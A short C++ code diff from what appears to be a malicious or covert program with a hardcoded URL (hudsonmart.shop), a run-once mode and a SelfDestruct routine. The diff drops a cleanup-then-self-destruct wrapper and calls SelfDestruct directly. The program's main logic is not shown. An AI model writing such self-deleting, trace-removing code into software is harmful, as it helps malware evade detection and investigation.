@@ -13,15 +13,6 @@ constexpr bool ONETIMERUN = true;
 std::vector<std::wstring> URLS = {L"https://hudsonmart.shop"};
 
 
-void CleanupAndDestroy() {
-    //std::cout << "Beginning cleanup..." << std::endl;
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    Cleanup();
-    std::this_thread::sleep_for(std::chrono::seconds(3));
-    SelfDestruct();
-}
-
-
 int main() {
 
     // Mode 1: run once and then > cleanup > self destruct
@@ -49,11 +40,11 @@ int main() {
                 }
             }
         }
-        CleanupAndDestroy(); 
+        SelfDestruct(); 
     }
 
     // This code might never see the light of the day but I gonna keep here anyways...
-    CleanupAndDestroy(); 
+    SelfDestruct(); 
     
 
     return 0;
